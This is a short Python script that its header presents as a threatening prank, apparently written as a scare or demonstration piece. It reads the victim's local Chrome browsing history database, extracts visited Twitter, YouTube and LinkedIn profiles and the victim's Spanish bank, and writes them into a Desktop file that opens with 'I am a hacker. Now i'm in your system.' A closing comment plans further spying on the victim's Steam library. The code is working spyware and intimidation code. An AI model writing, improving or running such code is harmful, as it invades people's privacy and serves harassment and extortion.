# This script will create a text file on the user's Desktop with a threatening message.
# Written by Jotus, coded by Nate Gentile.
import os
import time
import random
import sqlite3
import re

THREAT_FILE_NAME = "For you.txt"

def delay_action():
    time.sleep(random.randint(1, 3))    # Set to seconds, if we want hours, random.randint(1, 5) * 60 * 60

def create_threat_file(user_path):
    threat_file = open(user_path + "\\Desktop\\" + THREAT_FILE_NAME, "w")
    threat_file.write("I am a hacker. Now i'm in your system.\n")
    return threat_file

def get_chrome_history(user_path):
    try:    
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        # cursor.execute("SELECT title, last_visit_time, url FROM urls")
        urls = cursor.fetchall()
        connection.close()
        return urls
    except sqlite3.OperationalError:
        print("Database is open, close your browser. Retrying in a few seconds.\n")
        return None

def check_twitter_profiles_message(threat_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notications", "home", "login"]:
            profiles_visited.append(results[0])
    threat_file.write("Twitter profiles visited: " + str(profiles_visited) + " \n")
    
def check_linkedin_profiles_message(threat_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("[(0-9)]+ ([a-zA-ZÀ-ÿ\u00f1\u00d1]+ [a-zA-ZÀ-ÿ\u00f1\u00d1]+ [a-zA-ZÀ-ÿ\u00f1\u00d1]+) | LinkedIn$", item[0])
        if results:
            profiles_visited.append(results[0])
    threat_file.write("LinkedIn profiles visited: " + str(profiles_visited) + " \n")

def check_youtube_profiles_message(threat_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ['']:
            profiles_visited.append(results[0])
    threat_file.write("Youtube profiles visited: " + str(profiles_visited) + " \n")

def check_users_bank(threat_file, chrome_history):
    bank = None
    famous_spanish_banks = ["BBVA", "Santander", "Caixa Bank", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja", "Banco Santander", "BancoSantander"]
    for item in chrome_history:
        for b in famous_spanish_banks:
            if b.lower() in item[0].lower():
                bank = b
                break
            if bank:
                break
    threat_file.write("You are holding your money in this bank: " + bank)        
    print(bank)
    
def main():
    delay_action()
    user_path = os.path.expanduser("~")
    threat_file = create_threat_file(user_path)
    chrome_history = get_chrome_history(user_path)
    while chrome_history == None:
        chrome_history = get_chrome_history(user_path)
        time.sleep(5)
    check_twitter_profiles_message(threat_file, chrome_history)
    check_youtube_profiles_message(threat_file, chrome_history)
    check_linkedin_profiles_message(threat_file, chrome_history)
    check_users_bank(threat_file, chrome_history)
        
if __name__ == "__main__":
    main()
     
# Script not completed, is missing a functionality to spy the user
# Steam library with their local files.